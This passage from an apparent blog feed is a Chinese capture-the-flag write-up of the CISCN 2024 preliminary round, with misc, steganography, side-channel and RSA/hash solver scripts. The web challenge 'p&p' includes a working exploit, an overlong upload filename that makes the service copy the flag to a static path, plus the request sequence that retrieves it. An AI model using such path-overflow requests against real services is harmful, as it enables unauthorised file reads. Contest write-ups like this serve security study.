class="keyword">def</span> <span class="title function_">extract_alternate_bytes</span>(<span class="params">input_file, output_file</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(input_file, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> infile, <span class="built_in">open</span>(output_file, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> outfile:</span><br><span class="line">            byte = infile.read(<span class="number">1</span>)  <span class="comment"># 读取第一个字节</span></span><br><span class="line">            <span class="keyword">while</span> byte:</span><br><span class="line">                outfile.write(byte)  <span class="comment"># 写入这个字节到输出文件</span></span><br><span class="line">                infile.seek(<span class="number">1</span>, <span class="number">1</span>)  <span class="comment"># 跳过下一个字节</span></span><br><span class="line">                byte = infile.read(<span class="number">1</span>)  <span class="comment"># 读取下一个字节</span></span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;提取完成，结果已保存到 <span class="subst">&#123;output_file&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;出现错误: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用示例</span></span><br><span class="line">input_file = <span class="string">&#x27;1&#x27;</span>  <span class="comment"># 为stegsolve导出的文件16进制</span></span><br><span class="line">output_file = <span class="string">&#x27;1.zip&#x27;</span>  <span class="comment"># 替换为你的输出文件名</span></span><br><span class="line">extract_alternate_bytes(input_file, output_file)</span><br></pre></td></tr></table></figure><p>得到压缩包中一个.b文件，base85解码之后微步分析</p><img src="/2024/05/19/CISCN2024/13.png" class=""><p>得到ip，39.100.72.235</p><img src="/2024/05/19/CISCN2024/14.png" class=""><p>得到flag <code>flag&#123;096e8b0f9daf10869f013c1b7efda3fd&#125;</code></p><h3 id="通风机"><a href="#通风机" class="headerlink" title="通风机"></a>通风机</h3><p>上网搜了下mwp后缀文件搜索软件最终找到了STEP 7-MicroWIN SMART一开始发现文件导不进去，对比了下正确文件的文件头，修补一下文件头。</p><img src="/2024/05/19/CISCN2024/15.png" class=""><p>打开之后在符号表中找到了flag的base64编码</p><img src="/2024/05/19/CISCN2024/16.png" class=""><p>直接base64解码一下得到flag</p><p><code>flag&#123;2467ce26-fff9-4008-8d55-17df83ecbfc2&#125;</code></p><h3 id="神秘文件"><a href="#神秘文件" class="headerlink" title="神秘文件"></a>神秘文件</h3><ol><li>ppt中找到密文得到part4：6f-40</li><li>ppt备注找到密文，base64循环解密之后得到part5：5f-90d</li><li>缩小后发现密文，得到part6：d-2</li><li>解压文件有一张图片 <img src="/2024/05/19/CISCN2024/17.png" class="">part9：dee</li><li>在ppt&#x2F;comments&#x2F;comment1.xml文件中找到part10：9}</li><li>在ppt\embeddings中可以找到一个word，从中可以获得凯撒解密获得part2：675efb</li><li>在ppt&#x2F;slideLayouts&#x2F;slideLayout2.xml中找到密文，去点多余的字符，解密得到part8：87e</li><li>ppt&#x2F;slides&#x2F;slide4.xml中找到密文，rot13后解密得part7：22b3</li><li>在\docProps\core.xml中找到密文密钥，使用Bifid解密得到part1：flag{e</li><li>ppt的vbaProject.bin文件中找到一串密文，rc4解密后得到part3：3-34</li></ol><p>按顺序拼接即是flag。flag{e675efb3-346f-405f-90dd-222b387edee9}</p><h3 id="大学生安全测试能力调研问卷"><a href="#大学生安全测试能力调研问卷" class="headerlink" title="大学生安全测试能力调研问卷"></a>大学生安全测试能力调研问卷</h3><p>略</p><h3 id="p-p"><a href="#p-p" class="headerlink" title="p&amp;p"></a>p&amp;p</h3><p>按照主页提示拿到 <a href="http://www.zip/">www.zip</a> 源码。</p><p>将vuln.wasm拖入jeb分析，在 f15 中找到了主逻辑。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __f15() &#123;</span><br><span class="line">    __f13();</span><br><span class="line">    __f14();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>关键步骤__f14(),通过测试是将flag.txt写入file.txt的位置</p><p>经过分析发现 164 个字符可以写到 file.txt 的位置，又因为被限制只能写入8个字符，而当前目录任意文件名长度为1的文件即可满足要求<code>static/x</code>。</p><p>exp：</p><p>顺序访问以下路由即可得到flag文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/upload?name=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaastatic/a</span><br><span class="line">/test</span><br><span class="line">/static/a</span><br></pre></td></tr></table></figure><p>flag{4c11b668-5872-4066-8ec5-50c87134972d}</p><h3 id="Power-Trajectory-Diagram"><a href="#Power-Trajectory-Diagram" class="headerlink" title="Power Trajectory Diagram"></a>Power Trajectory Diagram</h3><p>根据题目描述</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line">f = np.load(<span class="string">&#x27;attachment.npz&#x27;</span>)</span><br><span class="line">index = f[<span class="string">&#x27;index&#x27;</span>]</span><br><span class="line">inputs = f[<span class="string">&#x27;input&#x27;</span>]</span><br><span class="line">traces = f[<span class="string">&#x27;trace&#x27;</span>]</span><br><span class="line"><span class="keyword">for</span> iteration <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">12</span>):</span><br><span class="line">    t = []</span><br><span class="line">    table = inputs[<span class="number">40</span>*iteration:<span class="number">40</span>*(iteration+<span class="number">1</span>)]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">40</span>):</span><br><span class="line">        min_index = np.argmin(traces[iteration*<span class="number">40</span> + i])</span><br><span class="line">        t.append(min_index)</span><br><span class="line">    max_index = np.argmax(t)</span><br><span class="line">    ch = table[max_index]</span><br><span class="line">    <span class="built_in">print</span>(ch, end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><p>解出flag <code>flag&#123;_ciscn_2024_&#125;</code></p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="古典密码"><a href="#古典密码" class="headerlink" title="古典密码"></a>古典密码</h3><img src="/2024/05/19/CISCN2024/18.png" class=""><p>flag flag{b2bb0873-8cae-4977-a6de-0e298f0744c3}</p><h3 id="hash"><a href="#hash" class="headerlink" title="hash"></a>hash</h3><p>通过查阅文献了解到 python2.7 的hash函数返回值是 64 位的 int 数，因此做的计算相当于会对 1&lt;&lt;64 取模。</p><p>根据计算的特点写出脚本计算七位随机值：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> gmpy2 <span class="keyword">as</span> gp</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> hashlib,binascii</span><br><span class="line">l=<span class="number">64</span></span><br><span class="line">mask=(<span class="number">1</span>&lt;&lt;<span class="number">64</span>)-<span class="number">1</span></span><br><span class="line"><span class="built_in">dict</span>=&#123;&#125;</span><br><span class="line"><span class="keyword">for</span> a <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">    x = <span class="number">0</span></span><br><span class="line">    x=(x^(a&lt;&lt;<span class="number">7</span>))&amp;mask</span><br><span class="line">    x = ((x * <span class="number">1000003</span>) ^ a) &amp; mask</span><br><span class="line">    <span class="keyword">for</span> b <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        x2=((x*<span class="number">1000003</span>)^b)&amp;mask</span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">            x3=((x2*<span class="number">1000003</span>)^c)&amp;mask</span><br><span class="line">            <span class="built_in">dict</span>[x3]=<span class="built_in">bytes</span>([a,b,c])</span><br><span class="line">ni=inverse(<span class="number">1000003</span>,<span class="number">1</span>&lt;&lt;<span class="number">64</span>)</span><br><span class="line">r=<span class="number">7457312583301101235</span></span><br><span class="line"><span class="keyword">for</span> a <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">    <span class="built_in">print</span>(a)</span><br><span class="line">    r1=((r^a)*ni)&amp;mask</span><br><span class="line">    <span class="keyword">for</span> b <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        r2=((r1^b)*ni)&amp;mask</span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">            r3 = ((r2 ^ c) * ni) &amp; mask</span><br><span class="line">            <span class="keyword">for</span> d <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">                r4 = ((r3 ^ d) * ni) &amp; mask</span><br><span class="line">                <span class="keyword">if</span> r4 <span class="keyword">in</span> <span class="built_in">dict</span>.keys():</span><br><span class="line">                    <span class="built_in">print</span>(<span class="built_in">dict</span>[r4]+<span class="built_in">bytes</span>([d,c,b,a]))</span><br><span class="line">                    exit(<span class="number">0</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>得到key的值为 <code>b&#39;]\x8c\xf0?Z\x08R&#39;</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python2</span></span><br><span class="line"><span class="comment"># Python 2.7 (64-bit version)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os, binascii, hashlib</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">key = <span class="string">b&#x27;]\x8c\xf0?Z\x08R&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hash</span>(key))</span><br><span class="line">flag=<span class="number">13903983817893117249931704406959869971132956255130487015289848690577655239262013033618370827749581909492660806312017</span></span><br><span class="line"><span class="built_in">print</span> (long_to_bytes(<span class="built_in">int</span>(hashlib.sha384(binascii.hexlify(key)).hexdigest(), <span class="number">16</span>) ^ flag))</span><br></pre></td></tr></table></figure><p>运行即可得到flag <code>flag&#123;bdb537aa-87ef-4e95-bea4-2f79259bdd07&#125;</code></p><h3 id="OvO"><a href="#OvO" class="headerlink" title="OvO"></a>OvO</h3><p>直接令 rr&#x3D;e&#x2F;&#x2F;n，因为可以发现其它常数基本远小于 rr*N 的数量级，kk&#x3D;rr-2。</p><p>联立方程可以得到 p 的近似值</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sympy</span><br><span class="line"></span><br><span class="line">n = <span class="number">111922722351752356094117957341697336848130397712588425954225300832977768690114834703654895285440684751636198779555891692340301590396539921700125219784729325979197290342352480495970455903120265334661588516182848933843212275742914269686197484648288073599387074325226321407600351615258973610780463417788580083967</span></span><br><span class="line">e = <span class="number">37059679294843322451875129178470872595128216054082068877693632035071251762179299783152435312052608685562859680569924924133175684413544051218945466380415013172416093939670064185752780945383069447693745538721548393982857225386614608359109463927663728739248286686902750649766277564516226052064304547032760477638585302695605907950461140971727150383104</span></span><br><span class="line">c = <span class="number">14999622534973796113769052025256345914577762432817016713135991450161695032250733213228587506601968633155119211807176051329626895125610484405486794783282214597165875393081405999090879096563311452831794796859427268724737377560053552626220191435015101496941337770496898383092414492348672126813183368337602023823</span></span><br><span class="line"></span><br><span class="line">rr = e//n</span><br><span class="line">kk = rr-<span class="number">2</span></span><br><span class="line">xx = sympy.symbols(<span class="string">&#x27;xx&#x27;</span>)</span><br><span class="line">s = (kk+rr)*xx*xx +(rr*n+rr+<span class="number">65538</span>-e)*xx + rr*n</span><br><span class="line">xx = sympy.solve(s,<span class="string">&#x27;xx&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">int</span>(xx[<span class="number">1</span>]))</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>运行之后得到P的近似值</p><img src="/2024/05/19/CISCN2024/19.png" class=""><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#9915449532466780441980882114644132757469503045317741049786571327753160105973102603393585703801838713884852201325856459312958617061518425294700379906584666</span></span><br></pre></td></tr></table></figure><p>做法参考了本篇博客 <a href="https://blog.csdn.net/XiongSiqi_blog/article/details/130171830%E3%80%82">https://blog.csdn.net/XiongSiqi_blog/article/details/130171830。</a></p><p>得到近似值之后变为 partial p 的问题，网上脚本也挺多的，这里参考了这一偏文章 <a href="https://dunkirkturbo.github.io/2020/02/28/Summary-of-Crypto-in-CTF-RSA/">https://dunkirkturbo.github.io/2020/02/28/Summary-of-Crypto-in-CTF-RSA/</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">n = <span class="number">111922722351752356094117957341697336848130397712588425954225300832977768690114834703654895285440684751636198779555891692340301590396539921700125219784729325979197290342352480495970455903120265334661588516182848933843212275742914269686197484648288073599387074325226321407600351615258973610780463417788580083967</span></span><br><span class="line">e = <span class="number">37059679294843322451875129178470872595128216054082068877693632035071251762179299783152435312052608685562859680569924924133175684413544051218945466380415013172416093939670064185752780945383069447693745538721548393982857225386614608359109463927663728739248286686902750649766277564516226052064304547032760477638585302695605907950461140971727150383104</span></span><br><span class="line">c = <span class="number">14999622534973796113769052025256345914577762432817016713135991450161695032250733213228587506601968633155119211807176051329626895125610484405486794783282214597165875393081405999090879096563311452831794796859427268724737377560053552626220191435015101496941337770496898383092414492348672126813183368337602023823</span></span><br><span class="line">pbar = <span class="number">9915449532466780441980882114644132757469503045317741049786571327753160105973102603393585703801838713884852201325856459312958617061518425294700379906584666</span></span><br><span class="line">kbits = <span class="number">100</span></span><br><span class="line">PR.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">f = x + pbar</span><br><span class="line">x0 = f.small_roots(X=<span class="number">2</span>^kbits, beta=<span class="number">0.4</span>)[<span class="number">0</span>]  <span class="comment"># find root &lt; 2^kbits with factor &gt;= n^0.4</span></span><br><span class="line">p = x0 + pbar</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;p:&quot;</span>, p)</span><br><span class="line">q = n // <span class="built_in">int</span>(p)</span><br><span class="line"><span class="built_in">print</span>(p*q==n)</span><br></pre></td></tr></table></figure><img src="/2024/05/19/CISCN2024/20.png" class=""><p>成功分解 p 和 q 之后，就是正常的 RSA 解密算法。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">n = <span class="number">111922722351752356094117957341697336848130397712588425954225300832977768690114834703654895285440684751636198779555891692340301590396539921700125219784729325979197290342352480495970455903120265334661588516182848933843212275742914269686197484648288073599387074325226321407600351615258973610780463417788580083967</span></span><br><span class="line">e = <span class="number">37059679294843322451875129178470872595128216054082068877693632035071251762179299783152435312052608685562859680569924924133175684413544051218945466380415013172416093939670064185752780945383069447693745538721548393982857225386614608359109463927663728739248286686902750649766277564516226052064304547032760477638585302695605907950461140971727150383104</span></span><br><span class="line">c = <span class="number">14999622534973796113769052025256345914577762432817016713135991450161695032250733213228587506601968633155119211807176051329626895125610484405486794783282214597165875393081405999090879096563311452831794796859427268724737377560053552626220191435015101496941337770496898383092414492348672126813183368337602023823</span></span><br><span class="line">p = <span class="number">9915449532466780441980882114644132757469503045317741049786571327753160105973102603393585703801838713884852201325856459312958617061522496169870935934745091</span></span><br><span class="line">q = n//p</span><br><span class="line">rr = e//n</span><br><span class="line">kk = rr-<span class="number">2</span></span><br><span class="line"></span><br><span class="line">e = <span class="number">65537</span> + kk * p + rr * ((p+<span class="number">1</span>) * (q+<span class="number">1</span>)) + <span class="number">1</span></span><br><span class="line">d = inverse(e,(p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line">c = <span class="number">14999622534973796113769052025256345914577762432817016713135991450161695032250733213228587506601968633155119211807176051329626895125610484405486794783282214597165875393081405999090879096563311452831794796859427268724737377560053552626220191435015101496941337770496898383092414492348672126813183368337602023823</span></span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">pow</span>(c,d,n)))</span><br></pre></td></tr></table></figure><p>得到flag ：flag{b5f771c6-18df-49a9-9d6d-ee7804f5416c}</p>]]></content>
    
    
    <summary type="html">记录一下CISCN2024的初赛</summary>
    
    
    
    <category term="CTF" scheme="https://xia0ji233.github.io/categories/CTF/"/>
    
    <category term="CISCN" scheme="https://xia0ji233.github.io/categories/CTF/CISCN/"/>
    
    <category term="2024" scheme="https://xia0ji233.github.io/categories/CTF/CISCN/2024/"/>
    
    
  </entry>
  
</feed>
